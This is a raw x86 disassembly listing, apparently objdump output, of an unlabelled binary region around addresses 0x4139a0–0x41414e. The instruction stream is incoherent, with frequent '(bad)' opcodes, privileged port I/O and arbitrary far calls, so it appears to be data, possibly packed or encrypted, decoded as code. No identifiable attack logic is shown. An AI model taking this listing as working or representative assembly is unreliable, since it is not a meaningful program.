  4139a0:	jg     0x4139c1
  4139a2:	paddq  mm0,mm4
  4139a5:	push   edx
  4139a6:	or     eax,0xa44d74ff
  4139ab:	dec    edi
  4139ac:	push   cs
  4139ad:	xchg   esp,eax
  4139ae:	in     al,0x24
  4139b0:	aas    
  4139b1:	inc    eax
  4139b2:	sub    esi,DWORD PTR [esi-0x28]
  4139b5:	cld    
  4139b6:	dec    eax
  4139b7:	pusha  
  4139b8:	dec    ebp
  4139b9:	(bad)  
  4139bb:	dec    esp
  4139bc:	retf   
  4139bd:	retf   0x95f1
  4139c0:	adc    edi,ecx
  4139c2:	(bad)  
  4139c3:	mov    al,ds:0x77bff803
  4139c8:	inc    edx
  4139c9:	mov    ds:0xccbcf5cc,eax
  4139ce:	ds jne 0x413a36
  4139d1:	xor    eax,0x1c0519fa
  4139d6:	std    
  4139d7:	shl    BYTE PTR [ecx-0x61],1
  4139da:	mov    fs,WORD PTR [ecx-0x12b471f3]
  4139e0:	sub    eax,0xa265153c
  4139e5:	lahf   
  4139e6:	push   esi
  4139e7:	adc    ah,dh
  4139e9:	sbb    DWORD PTR [ebp+0x3e],0x5d
  4139ed:	lods   al,BYTE PTR ds:[esi]
  4139ee:	aad    0xde
  4139f0:	pusha  
  4139f1:	ins    DWORD PTR es:[edi],dx
  4139f2:	mov    esi,0x81d83207
  4139f7:	fwait
  4139f8:	sbb    al,0xbe
  4139fa:	cmp    eax,0x4020d378
  4139ff:	mul    DWORD PTR [ecx]
  413a01:	popf   
  413a02:	stos   DWORD PTR es:[edi],eax
  413a03:	or     DWORD PTR [ecx-0x56],esi
  413a06:	loop   0x413a78
  413a08:	mov    ds:0x85eb709f,eax
  413a0d:	sub    eax,0x3bf92839
  413a12:	sbb    cl,BYTE PTR [esi]
  413a14:	in     eax,0xdf
  413a16:	ret    0xd38
  413a19:	sahf   
  413a1a:	aad    0x16
  413a1c:	mov    ebp,DWORD PTR [esi-0x54]
  413a1f:	ins    DWORD PTR es:[edi],dx
  413a20:	inc    edi
  413a21:	loope  0x413a93
  413a23:	or     eax,0xc0801f9b
  413a28:	xchg   edi,eax
  413a29:	leave  
  413a2a:	sbb    eax,0xd563b7d9
  413a2f:	(bad)  
  413a30:	push   0x67
  413a32:	loopne 0x413a1d
  413a34:	arpl   WORD PTR [edi],ax
  413a36:	pop    ebp
  413a37:	jne    0x4139c9
  413a39:	setb   bh
  413a3c:	fbstp  TBYTE PTR [ebp+0x49]
  413a3f:	ds stos BYTE PTR es:[edi],al
  413a41:	mov    WORD PTR [esi+esi*2],ss
  413a44:	sbb    BYTE PTR [edi+ecx*4+0x50],0xc6
  413a49:	neg    BYTE PTR [eax]
  413a4b:	inc    edx
  413a4c:	xor    BYTE PTR [eax],cl
  413a4e:	dec    ebx
  413a4f:	out    0x4,eax
  413a51:	and    DWORD PTR [ebx],esp
  413a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a54:	sbb    eax,DWORD PTR [esi-0x870a5a5]
  413a5a:	jbe    0x4139ee
  413a5c:	jno    0x413a28
  413a5e:	push   ecx
  413a5f:	int    0x89
  413a61:	jne    0x413a71
  413a63:	fwait
  413a64:	bound  esp,QWORD PTR [ecx]
  413a66:	add    BYTE PTR [esi-0x3b],dh
  413a69:	xchg   ecx,eax
  413a6a:	lea    ecx,[edx]
  413a6c:	dec    edi
  413a6d:	sbb    BYTE PTR [edi],bh
  413a6f:	lods   eax,DWORD PTR ds:[esi]
  413a70:	jb     0x413ae2
  413a72:	xor    DWORD PTR [esi-0x78],eax
  413a75:	cs cmp al,0xf4
  413a78:	gs jae 0x413a18
  413a7b:	jne    0x413ae5
  413a7d:	stos   DWORD PTR es:[edi],eax
  413a7e:	(bad)  
  413a7f:	jae    0x413a37
  413a81:	mov    ds:0x32719cba,eax
  413a86:	or     BYTE PTR [ebp-0x26],ah
  413a89:	sbb    edi,DWORD PTR [ecx-0x2f]
  413a8c:	scas   al,BYTE PTR es:[edi]
  413a8d:	and    DWORD PTR [ebp-0x71740309],ebx
  413a93:	sub    eax,0x41db8e31
  413a98:	jno    0x413ab8
  413a9a:	loop   0x413aeb
  413a9c:	add    DWORD PTR [edx+edx*2-0x26],ebp
  413aa0:	sub    esi,DWORD PTR [eax+0x54]
  413aa3:	and    esi,edi
  413aa5:	pop    ds
  413aa6:	repnz out dx,al
  413aa8:	enter  0xfee7,0x73
  413aac:	outs   dx,BYTE PTR ds:[esi]
  413aad:	repnz fmul st,st(4)
  413ab0:	(bad)  
  413ab1:	and    BYTE PTR [edi+0x31],ch
  413ab4:	nop
  413ab5:	out    0x2e,eax
  413ab7:	ja     0x413aed
  413ab9:	aaa    
  413aba:	dec    esi
  413abb:	mov    DWORD PTR [edi-0x59c533e1],edi
  413ac1:	(bad)  
  413ac2:	cli    
  413ac3:	out    dx,eax
  413ac4:	jno    0x413a6e
  413ac6:	inc    ecx
  413ac7:	inc    edi
  413ac8:	dec    esi
  413ac9:	pop    ecx
  413aca:	notrack jmp DWORD PTR [ecx-0x2d60fede]
  413ad1:	repz jmp 0x1975:0xac8b14e7
  413ad9:	xchg   ecx,eax
  413ada:	imul   eax,DWORD PTR [edx+0x71],0x60f683c9
  413ae1:	ds jl  0x413b3d
  413ae4:	mov    cl,0x1f
  413ae6:	das    
  413ae7:	das    
  413ae8:	mov    ds,WORD PTR [esi-0x2e495515]
  413aee:	repz das 
  413af0:	xchg   ebx,eax
  413af1:	sbb    eax,edx
  413af3:	mov    BYTE PTR [ecx+0x0],dh
  413af6:	rcr    DWORD PTR [edx+0x65715d27],0x85
  413afd:	push   ss
  413afe:	retf   0xf390
  413b01:	and    ah,BYTE PTR [ebx+0x47]
  413b04:	cdq    
  413b05:	mov    ds:0xa511ec07,al
  413b0a:	stos   DWORD PTR es:[edi],eax
  413b0b:	inc    esp
  413b0c:	sub    DWORD PTR [edi],edx
  413b0e:	adc    DWORD PTR [esi+esi*2-0x52],esi
  413b12:	ffreep st(0)
  413b14:	std    
  413b15:	lahf   
  413b16:	pop    ecx
  413b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b18:	rcr    BYTE PTR [edi+eiz*2+0xcf34b76],cl
  413b1f:	mov    bl,0x50
  413b21:	cld    
  413b22:	into   
  413b23:	cmp    BYTE PTR [ecx],dl
  413b25:	jnp    0x413abe
  413b27:	test   al,0x71
  413b29:	xchg   DWORD PTR [eax+eax*4-0x1fa37a60],ebx
  413b30:	jne    0x413b58
  413b32:	jno    0x413acf
  413b34:	pop    ecx
  413b35:	xchg   DWORD PTR [edx],edi
  413b37:	adc    eax,0x827e4b39
  413b3c:	push   ebp
  413b3d:	(bad)  
  413b3f:	mov    ebx,0x53d55561
  413b44:	mov    ds,WORD PTR [eax-0x6ca5f5f2]
  413b4a:	mov    WORD PTR [ebp-0x2f],?
  413b4d:	push   esp
  413b4e:	mov    esp,0xcbc58d63
  413b53:	shl    BYTE PTR [ecx-0x4d],1
  413b56:	adc    al,0x77
  413b58:	in     al,dx
  413b59:	div    BYTE PTR [edi]
  413b5b:	mov    eax,DWORD PTR [ebx-0x7bedba91]
  413b61:	and    esi,DWORD PTR [ebp+0x139a2814]
  413b67:	xor    eax,0xbe1c142f
  413b6c:	je     0x413b8f
  413b6e:	movq   mm4,mm2
  413b71:	in     al,dx
  413b72:	sub    ecx,DWORD PTR ds:0x7533ad33
  413b78:	loopne 0x413b6a
  413b7a:	call   0x224a37b4
  413b7f:	rep stos DWORD PTR es:[edi],eax
  413b81:	retf   
  413b82:	push   ds
  413b83:	jne    0x413ba4
  413b85:	lea    edi,[ebp+0x60]
  413b88:	mov    BYTE PTR [ecx-0xb],ch
  413b8b:	je     0x413bfd
  413b8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b8e:	(bad)  
  413b8f:	rcl    DWORD PTR [ebx-0x4c],0x18
  413b93:	out    dx,eax
  413b94:	jno    0x413ba8
  413b96:	pushf  
  413b97:	fldenv ds:0x41bc192c
  413b9d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  413b9f:	scas   al,BYTE PTR es:[edi]
  413ba0:	xchg   edx,eax
  413ba1:	push   ecx
  413ba2:	test   BYTE PTR [edx-0x2f],bh
  413ba5:	push   ebx
  413ba6:	stc    
  413ba7:	fcmovu st,st(3)
  413ba9:	(bad)  
  413baa:	aad    0x1a
  413bac:	mov    BYTE PTR ds:0x488e1533,cl
  413bb2:	or     al,0x75
  413bb4:	sbb    dl,dl
  413bb6:	xchg   ebx,eax
  413bb7:	popa   
  413bb8:	jp     0x413bde
  413bba:	sbb    edi,DWORD PTR [ebp+0x71]
  413bbd:	add    ecx,esp
  413bbf:	and    edi,esi
  413bc1:	into   
  413bc2:	pop    eax
  413bc3:	(bad)  
  413bc5:	pop    ds
  413bc6:	xchg   esp,eax
  413bc7:	push   ss
  413bc8:	test   eax,0x762679f9
  413bcd:	adc    ch,0x9e
  413bd0:	imul   ebx,DWORD PTR [esi-0x5d],0x67d1cbfd
  413bd7:	ja     0x413bb4
  413bd9:	loope  0x413c4b
  413bdb:	cmp    eax,0x8c3557b1
  413be0:	out    dx,eax
  413be1:	adc    esp,esp
  413be3:	mov    al,ds:0x75a0cc72
  413be8:	icebp  
  413be9:	push   eax
  413bea:	jns    0x413c03
  413bec:	jmp    0x413c0d
  413bee:	pop    edx
  413bef:	add    BYTE PTR [ebx+0x4c63f9],0x34
  413bf6:	hlt    
  413bf7:	rcr    DWORD PTR [esi],1
  413bf9:	jne    0x413b91
  413bfb:	adc    BYTE PTR [edi*1+0x71415c0b],0xff
  413c03:	je     0x413bcc
  413c05:	loope  0x413c2a
  413c07:	adc    esi,DWORD PTR [ecx]
  413c09:	pop    edx
  413c0a:	pop    edi
  413c0b:	dec    edi
  413c0c:	jno    0x413c45
  413c0e:	mov    al,ds:0xc2aebe79
  413c13:	test   DWORD PTR ds:0x5254f820,ebx
  413c19:	push   esp
  413c1a:	dec    ebx
  413c1b:	(bad)  
  413c1c:	cli    
  413c1d:	inc    esp
  413c1e:	aad    0x27
  413c20:	fs mov bl,0xa
  413c23:	popf   
  413c24:	push   esi
  413c25:	push   0xffffff8e
  413c27:	jne    0x413c98
  413c29:	pop    ss
  413c2a:	into   
  413c2b:	popa   
  413c2c:	outs   dx,BYTE PTR ds:[esi]
  413c2d:	adc    al,0xc0
  413c2f:	cmp    al,0x71
  413c31:	mov    eax,ds:0x28b681ff
  413c36:	loopne 0x413bfa
  413c38:	bound  eax,QWORD PTR [esi]
  413c3a:	icebp  
  413c3b:	je     0x413c17
  413c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c3e:	out    dx,al
  413c3f:	xchg   esi,eax
  413c40:	arpl   WORD PTR [esi+0x6a],bx
  413c43:	pop    edx
  413c44:	jno    0x413be0
  413c46:	pop    ecx
  413c47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c48:	xor    edi,DWORD PTR [esi+eiz*8]
  413c4b:	ret    
  413c4c:	es and ah,cl
  413c4f:	pushf  
  413c50:	xchg   ebp,eax
  413c51:	jg     0x413c13
  413c53:	pop    esp
  413c54:	into   
  413c55:	stos   BYTE PTR es:[edi],al
  413c56:	(bad)  
  413c58:	leave  
  413c59:	fisttp QWORD PTR [edi+0x35]
  413c5c:	xor    DWORD PTR [edi-0x77],esp
  413c5f:	add    cl,BYTE PTR ds:0xf80b9423
  413c65:	nop
  413c66:	or     BYTE PTR [eax],0x20
  413c69:	and    DWORD PTR [edx+0x36fbbad7],esp
  413c6f:	push   ebx
  413c70:	test   BYTE PTR [edx+0x71791b],bl
  413c76:	jecxz  0x413c20
  413c78:	lock cld 
  413c7a:	jo     0x413cf8
  413c7c:	push   edx
  413c7d:	jae    0x413c8d
  413c7f:	sti    
  413c80:	fs push eax
  413c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c83:	(bad)
  413c87:	fwait
  413c88:	jno    0x413c39
  413c8a:	mov    bl,ah
  413c8c:	popa   
  413c8d:	fisttp QWORD PTR [ebp+edi*2-0xdb3e047]
  413c94:	psubsb mm7,mm1
  413c97:	mov    bl,0x86
  413c99:	rcl    ebp,1
  413c9b:	push   edx
  413c9c:	mov    esi,0x4b0adbc3
  413ca1:	imul   edi,ebp,0x62
  413ca4:	pop    eax
  413ca5:	and    BYTE PTR [ebx-0x4a],ah
  413ca8:	add    BYTE PTR [ecx-0x557e0a59],cl
  413cae:	lds    edx,FWORD PTR [esi+0x41e8c471]
  413cb4:	mov    ecx,0x27c6498c
  413cb9:	loopne 0x413cba
  413cbb:	adc    bh,BYTE PTR [eax+0x534d6ac3]
  413cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cc2:	fcom   DWORD PTR [edi-0x1c201069]
  413cc8:	and    eax,0x166fb9c8
  413ccd:	daa    
  413cce:	jne    0x413c9f
  413cd0:	int3   
  413cd1:	cmp    BYTE PTR [edi+0x1f4b1e95],dh
  413cd7:	push   edx
  413cd8:	jno    0x413d13
  413cda:	mov    al,0x2f
  413cdc:	cmc    
  413cdd:	sti    
  413cde:	cmp    eax,0xfa5f18c4
  413ce3:	jno    0x413c8f
  413ce5:	mov    ds:0xb0bd7550,al
  413cea:	mov    dh,0xa
  413cec:	loopne 0x413d22
  413cee:	(bad)  
  413cef:	dec    ecx
  413cf0:	jno    0x413d3e
  413cf2:	aas    
  413cf3:	jg     0x413d1d
  413cf5:	mov    ebx,0x1fc463f3
  413cfa:	and    ch,al
  413cfc:	js     0x413d5c
  413cfe:	call   0x87b2:0xd60afa0d
  413d05:	push   es
  413d06:	mov    dh,0x50
  413d08:	cs xchg edi,eax
  413d0a:	cmp    DWORD PTR [edi-0xb],esi
  413d0d:	jge    0x413d8c
  413d0f:	sbb    al,0x8f
  413d11:	imul   ebp,DWORD PTR [edx],0x52878bb5
  413d17:	js     0x413ca0
  413d19:	dec    edi
  413d1a:	mov    ecx,0x858aa00a
  413d1f:	mov    WORD PTR [esi-0x4bb41b5c],?
  413d25:	mov    dl,0x1b
  413d27:	push   ebp
  413d28:	or     dh,BYTE PTR [edx+ecx*1-0x29]
  413d2c:	cli    
  413d2d:	pop    ds
  413d2e:	sbb    DWORD PTR [ebx],0x40f21738
  413d34:	adc    ecx,DWORD PTR [edi+edx*8]
  413d37:	fisttp WORD PTR [si+0x6f]
  413d3b:	mov    edi,0xdba1d11f
  413d40:	fsub   DWORD PTR [ebx]
  413d42:	pop    esi
  413d43:	mov    esp,0x3c6d9f7e
  413d48:	cmp    dh,al
  413d4a:	push   edi
  413d4b:	rep stos BYTE PTR es:[edi],al
  413d4d:	xor    edx,ebp
  413d4f:	push   ss
  413d50:	and    BYTE PTR [esi],bl
  413d52:	retf   0xe4f9
  413d55:	iret   
  413d56:	push   esp
  413d57:	jne    0x413dd3
  413d59:	inc    eax
  413d5a:	es cs push ebx
  413d5d:	add    eax,0xf771fcd3
  413d62:	sbb    eax,DWORD PTR [edx-0x5a]
  413d65:	sub    eax,0x20107ad6
  413d6a:	xchg   ebx,eax
  413d6b:	fsubr  QWORD PTR [eax]
  413d6d:	push   ss
  413d6e:	jo     0x413dc8
  413d70:	mov    eax,ds:0x4297d588
  413d75:	sub    eax,0x5703d169
  413d7a:	xlat   BYTE PTR ds:[ebx]
  413d7b:	jne    0x413d5a
  413d7d:	mov    edx,0xd2aca06b
  413d82:	pushf  
  413d83:	push   ecx
  413d84:	cmp    DWORD PTR ds:0x47353dd5,0x1a
  413d8b:	sbb    al,0x27
  413d8d:	popf   
  413d8e:	pop    edi
  413d8f:	test   BYTE PTR [ebx-0x36],ch
  413d92:	aas    
  413d93:	or     al,0x10
  413d95:	scas   al,BYTE PTR es:[edi]
  413d96:	or     al,0x20
  413d98:	xor    DWORD PTR [edi*8-0x26e113f2],edi
  413d9f:	retf   0x4883
  413da2:	popa   
  413da3:	add    edx,DWORD PTR [ebp-0x699b3a3a]
  413da9:	repnz mov bl,0x75
  413dac:	hlt    
  413dad:	jle    0x413d4f
  413daf:	jae    0x413d87
  413db1:	jge    0x413d34
  413db3:	shl    DWORD PTR [ecx+0x53],0xf4
  413db7:	ds repz aad 0xd9
  413dbb:	and    eax,DWORD PTR [eax+0x10dc91f]
  413dc1:	jmp    0x7a50093a
  413dc6:	aad    0x80
  413dc8:	in     al,0x67
  413dca:	out    0x9e,al
  413dcc:	neg    DWORD PTR [edx-0x32]
  413dcf:	out    0x36,eax
  413dd1:	pop    esp
  413dd2:	imul   edx,DWORD PTR [eax-0xf],0xfa1cbdca
  413dd9:	cmp    BYTE PTR [edx+ebx*8-0x1e4b198f],bh
  413de0:	mov    ch,0xc4
  413de2:	inc    edx
  413de3:	adc    al,0x62
  413de5:	and    BYTE PTR [ebx],cl
  413de7:	push   0xa57c704b
  413dec:	lods   al,BYTE PTR ds:[esi]
  413ded:	xor    edx,ebp
  413def:	jg     0x413e0f
  413df1:	sbb    eax,eax
  413df3:	sbb    bl,ah
  413df5:	lods   eax,DWORD PTR ds:[esi]
  413df6:	sbb    al,0x75
  413df8:	push   es
  413df9:	imul   esi,DWORD PTR [ebx-0x26],0x3bc19c0e
  413e00:	jno    0x413dfb
  413e02:	dec    edi
  413e03:	outs   dx,DWORD PTR ds:[esi]
  413e04:	sub    al,0xab
  413e06:	mov    eax,ds:0xac1f7673
  413e0b:	cs inc ebp
  413e0d:	outs   dx,DWORD PTR ds:[esi]
  413e0e:	mov    ebp,0x53644945
  413e13:	jle    0x413e87
  413e15:	imul   eax,DWORD PTR [eax],0x24
  413e18:	push   ecx
  413e19:	retf   
  413e1a:	cmp    esp,esi
  413e1c:	les    eax,FWORD PTR ss:[ebp+esi*2-0x2]
  413e21:	push   ds
  413e22:	lahf   
  413e23:	sbb    eax,0x7cdecd0f
  413e28:	or     al,0x47
  413e2a:	fdiv   QWORD PTR [esi+eiz*2-0x2e]
  413e2e:	ret    
  413e2f:	push   ecx
  413e30:	pusha  
  413e31:	and    BYTE PTR [esi-0x75e62de7],ah
  413e37:	or     esp,DWORD PTR ds:[edx-0x2b]
  413e3b:	and    esi,edi
  413e3d:	push   esi
  413e3f:	aas    
  413e40:	jle    0x413e34
  413e42:	and    DWORD PTR [esi-0x38],esi
  413e45:	jb     0x413e30
  413e47:	int3   
  413e48:	cmp    esp,DWORD PTR ds:0x2fcf6905
  413e4e:	xlat   BYTE PTR ds:[ebx]
  413e4f:	fstp   QWORD PTR [ecx+0x40b44e56]
  413e55:	add    cl,0x8b
  413e58:	call   FWORD PTR [edi]
  413e5a:	mov    DWORD PTR gs:[esi-0x47],0xa2f044f9
  413e62:	icebp  
  413e63:	add    eax,0xf591954f
  413e68:	and    DWORD PTR [edi+eax*4+0x1390ac0a],edx
  413e6f:	mov    ah,0x7a
  413e71:	cmp    dl,BYTE PTR [ebp-0x2f]
  413e74:	fdiv   DWORD PTR [edx]
  413e76:	inc    eax
  413e77:	les    esi,FWORD PTR [edi+0x35bbd5ae]
  413e7d:	sbb    BYTE PTR [esi+edx*4+0x75a31c80],dh
  413e84:	cmc    
  413e85:	dec    ebx
  413e86:	pop    ebp
  413e87:	frstor [eax+0x719e6d4a]
  413e8d:	mov    bl,0x7b
  413e8f:	in     eax,dx
  413e90:	arpl   bp,cx
  413e92:	jecxz  0x413eb4
  413e94:	xchg   BYTE PTR [ebp-0x47],al
  413e97:	call   0x7a735e34
  413e9c:	pop    esp
  413e9d:	(bad)  
  413e9e:	or     BYTE PTR [esp+esi*2+0x7aea9717],ah
  413ea5:	lods   al,BYTE PTR ds:[esi]
  413ea6:	loop   0x413f04
  413ea8:	loop   0x413ea1
  413eaa:	jno    0x413e59
  413eac:	pop    edx
  413ead:	sub    edx,DWORD PTR [ebp+0x7b]
  413eb0:	mov    dl,0xf8
  413eb2:	pop    esp
  413eb3:	sbb    DWORD PTR [ebx-0x4],0xffffffd7
  413eb7:	or     DWORD PTR [ebx-0x77],edi
  413eba:	push   eax
  413ebb:	xor    BYTE PTR [ebx+0x77],dh
  413ebe:	mov    ch,0x75
  413ec0:	lock pop eax
  413ec2:	rcl    dl,0x5
  413ec5:	ds inc edx
  413ec7:	mov    edi,0x75cd2cbd
  413ecc:	rcl    BYTE PTR [ebx],0x3e
  413ecf:	or     dh,BYTE PTR [edi-0x33]
  413ed2:	test   BYTE PTR [ebp+0x53],dh
  413ed5:	stos   BYTE PTR es:[edi],al
  413ed6:	mov    ds:0xad1a4474,eax
  413edb:	push   0x9447c371
  413ee0:	js     0x413ee2
  413ee2:	je     0x413e90
  413ee4:	push   0xd7664e20
  413ee9:	lahf   
  413eea:	inc    esi
  413eeb:	popa   
  413eec:	mov    eax,0x607ed606
  413ef1:	out    0xb,eax
  413ef3:	ss dec ebx
  413ef5:	and    DWORD PTR [eax+0x6940a47c],eax
  413efb:	mov    al,ds:0xd8bd6fa3
  413f00:	stos   DWORD PTR es:[edi],eax
  413f01:	push   es
  413f02:	push   ecx
  413f03:	fs jno 0x413ea1
  413f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f07:	iret   
  413f08:	xchg   ebx,eax
  413f09:	nop
  413f0a:	push   DWORD PTR [edx]
  413f0c:	sub    eax,0x3c668020
  413f11:	adc    BYTE PTR [ebp-0x6a12f4f6],ah
  413f17:	xor    ebp,DWORD PTR [ecx]
  413f19:	push   ecx
  413f1a:	add    DWORD PTR [eax+0x67],edi
  413f1d:	and    DWORD PTR [edi-0x4ba3cf84],ecx
  413f23:	pop    ebp
  413f24:	outs   dx,BYTE PTR ds:[esi]
  413f25:	nop
  413f26:	in     eax,dx
  413f27:	bnd jne 0x413eb7
  413f2a:	mov    ch,0x6c
  413f2c:	fldenv [esp+edx*4]
  413f2f:	xor    eax,0x2ac0a542
  413f34:	jno    0x413eb9
  413f36:	call   0xb4a9a6dc
  413f3b:	mov    ch,0x82
  413f3d:	pop    ds
  413f3e:	mov    ds:0x4f1f5293,al
  413f43:	sar    DWORD PTR [eax+edi*8+0x1bd4dbd5],cl
  413f4a:	loope  0x413f75
  413f4c:	push   ecx
  413f4d:	iret   
  413f4e:	jne    0x413fcc
  413f50:	in     al,0xb1
  413f52:	or     dl,BYTE PTR [edi+edx*8-0x41]
  413f56:	aam    0x36
  413f58:	test   eax,0x4c7cd5f3
  413f5d:	pop    DWORD PTR [edx]
  413f5f:	xlat   BYTE PTR ds:[ebx]
  413f60:	xor    DWORD PTR [edx-0x14088adc],ecx
  413f66:	or     ebx,esi
  413f68:	or     eax,0x72f228e6
  413f6d:	cmp    al,0xe2
  413f6f:	js     0x413fc6
  413f71:	or     ebx,eax
  413f73:	outs   dx,BYTE PTR ds:[esi]
  413f74:	popa   
  413f75:	xlat   BYTE PTR ds:[ebx]
  413f76:	shl    BYTE PTR [ebp-0x78],1
  413f79:	dec    DWORD PTR [ebx-0x2d4c667f]
  413f7f:	stos   BYTE PTR es:[edi],al
  413f80:	jno    0x413f1c
  413f82:	mov    ecx,0xeb877447
  413f87:	mov    ah,0x6f
  413f89:	and    BYTE PTR [edx-0x3d],bh
  413f8c:	sub    cl,BYTE PTR [edx-0x7b]
  413f8f:	lods   al,BYTE PTR ds:[esi]
  413f90:	test   eax,0x1918e397
  413f95:	xchg   edi,eax
  413f96:	add    ch,dh
  413f98:	mov    BYTE PTR [eax],ah
  413f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f9b:	(bad)  
  413f9c:	ins    BYTE PTR es:[edi],dx
  413f9d:	and    dl,bh
  413f9f:	sbb    ecx,eax
  413fa1:	push   ebp
  413fa2:	imul   edx,DWORD PTR [edi+ecx*4],0x29
  413fa6:	aad    0x93
  413fa8:	and    bl,ch
  413faa:	dec    ebp
  413fab:	int3   
  413fac:	fild   WORD PTR [eax+0x2692e7a2]
  413fb2:	mov    ah,0xaf
  413fb4:	mov    al,ds:0x76e53196
  413fb9:	(bad)  [esp+edx*8]
  413fbc:	jno    0x413f49
  413fbe:	dec    bx
  413fc0:	nop
  413fc1:	das    
  413fc2:	adc    DWORD PTR [ecx-0x6812dd1f],ebx
  413fc8:	repz clc 
  413fca:	mov    esi,0x75d251cc
  413fcf:	dec    edi
  413fd0:	jno    0x413f84
  413fd2:	xor    esi,DWORD PTR [esi]
  413fd4:	adc    al,0xc6
  413fd6:	lods   eax,DWORD PTR ds:[esi]
  413fd7:	add    BYTE PTR [ebx+0xb51d71f],cl
  413fdd:	sbb    DWORD PTR [ebx-0x2a0cde62],eax
  413fe3:	gs addr16 dec edx
  413fe6:	cmp    BYTE PTR [eax+0x755d80f5],al
  413fec:	popf   
  413fed:	enter  0x84bf,0xe7
  413ff1:	cmp    DWORD PTR [esi+0x49ef9510],eax
  413ff7:	push   eax
  413ff8:	jno    0x41402d
  413ffa:	push   ecx
  413ffb:	leave  
  413ffc:	mov    cl,0x92
  413ffe:	dec    esp
  413fff:	jne    0x41402c
  414001:	sti    
  414002:	xor    BYTE PTR [edx+esi*2-0x123478e3],bh
  414009:	mov    dl,0xd5
  41400b:	xchg   bl,bh
  41400d:	mov    ebp,0x45e8fc63
  414012:	les    esi,FWORD PTR [ebx+0x42]
  414015:	and    BYTE PTR [ebx],bh
  414017:	pop    ss
  414018:	and    eax,0x6755a29c
  41401d:	(bad)  
  41401f:	xor    esp,esp
  414021:	into   
  414022:	repnz cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  414025:	xor    al,0xf6
  414027:	cmp    DWORD PTR [ebx+0x12],0xffffffdd
  41402b:	out    0xf1,al
  41402d:	or     ecx,DWORD PTR [ecx+edx*4]
  414030:	not    DWORD PTR [eax+0x429cfbe8]
  414036:	xchg   ecx,eax
  414037:	sub    ch,BYTE PTR [ebp-0x1cf8aa9d]
  41403d:	loope  0x41407f
  41403f:	int    0xac
  414041:	int    0xd5
  414043:	cmp    BYTE PTR [ebx+0x5eab6a1c],ch
  414049:	loope  0x414017
  41404b:	jne    0x414019
  41404d:	or     bl,BYTE PTR [edx]
  41404f:	inc    esi
  414050:	sbb    ch,BYTE PTR [esi]
  414052:	pop    ds
  414053:	sub    esi,DWORD PTR [ecx-0x15]
  414056:	mov    bh,0xbb
  414058:	in     al,0xd7
  41405a:	dec    ebx
  41405b:	xchg   ebx,eax
  41405c:	pop    eax
  41405d:	lahf   
  41405e:	add    BYTE PTR [ebp-0x3f],dh
  414061:	add    esp,DWORD PTR [ecx-0x5a]
  414064:	mov    ecx,0xeace2959
  414069:	sbb    bh,dl
  41406b:	mov    edi,0x43be5153
  414071:	dec    esp
  414072:	dec    edi
  414073:	cmc    
  414074:	retf   
  414075:	push   0xffffff80
  414077:	cmp    al,0x71
  414079:	ret    
  41407a:	add    al,0x24
  41407c:	mov    dh,0x96
  41407e:	in     al,0x6c
  414080:	mov    ebp,0x5c4dca1f
  414085:	scas   al,BYTE PTR es:[edi]
  414086:	mov    bl,0x66
  414088:	mov    eax,DWORD PTR [edx-0x2b]
  41408b:	fbld   TBYTE PTR [edx-0x73f26998]
  414091:	cmp    al,0x6e
  414093:	mov    ah,0xaa
  414095:	sub    edx,DWORD PTR [ebp+0x37]
  414098:	fnstcw WORD PTR [edi]
  41409a:	sar    dh,0xb0
  41409d:	adc    esi,edx
  41409f:	iret   
  4140a0:	xor    DWORD PTR [ebx+0x5a],eax
  4140a3:	mov    dh,0x27
  4140a5:	sub    BYTE PTR [ebp+esi*2+0x11],al
  4140a9:	fcom   DWORD PTR [eax]
  4140ab:	clc    
  4140ac:	sbb    edx,DWORD PTR [edx+0x3f71a937]
  4140b2:	mov    WORD PTR [ecx],?
  4140b4:	das    
  4140b5:	pushf  
  4140b6:	inc    esi
  4140b7:	call   0x6300:0xa77e1fbc
  4140be:	add    bl,bl
  4140c0:	xor    BYTE PTR [edi],dl
  4140c2:	(bad)  
  4140c3:	mov    ds:0xbc147daf,al
  4140c8:	call   0xd515:0x1a7537b5
  4140cf:	std    
  4140d0:	pop    eax
  4140d1:	jae    0x414070
  4140d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140d4:	jno    0x41414a
  4140d6:	dec    eax
  4140d7:	rcr    DWORD PTR [ecx+edi*1-0x4e],0x4
  4140dc:	sub    esp,DWORD PTR [edi]
  4140de:	mov    cl,0x12
  4140e0:	sub    eax,0xff44d921
  4140e5:	imul   ebp
  4140e7:	test   eax,0x12e9c371
  4140ec:	retf   0x7a7a
  4140ef:	(bad)  
  4140f0:	cmp    BYTE PTR [edx+edi*8],al
  4140f3:	je     0x414169
  4140f5:	cmp    dh,dh
  4140f7:	xor    BYTE PTR [esi-0x6],al
  4140fa:	pop    ss
  4140fb:	mov    esi,0xf64a7f71
  414100:	mov    esi,db0
  414103:	mov    ch,0x11
  414105:	xchg   ebp,eax
  414106:	stc    
  414107:	je     0x4140e4
  414109:	out    dx,al
  41410a:	cs add ch,BYTE PTR es:0x3e71236e
  414112:	xor    eax,0x60740547
  414117:	pushf  
  414118:	loope  0x414139
  41411a:	neg    BYTE PTR [ecx-0x43]
  41411d:	sub    BYTE PTR [eax-0x77],0x20
  414121:	sub    ebp,edx
  414123:	xchg   edi,eax
  414124:	addr16 lahf 
  414126:	push   0xffffffa6
  414128:	pop    edi
  414129:	out    0x30,al
  41412b:	jl     0x4140c9
  41412d:	dec    ebx
  41412e:	inc    ebp
  41412f:	dec    edx
  414130:	push   edi
  414131:	add    BYTE PTR [ecx],bh
  414133:	sbb    DWORD PTR [esi+0x5bf5c3af],0xffffffaf
  41413a:	aad    0x78
  41413c:	mov    edx,0xdf88be8e
  414141:	mov    ch,0xf9
  414143:	je     0x4140f6
  414145:	or     DWORD PTR ss:[eax-0x5a],0x1c
  41414a:	popa   
  41414b:	fwait
  41414c:	jno    0x414150
  41414e:	loope  0x4140fc
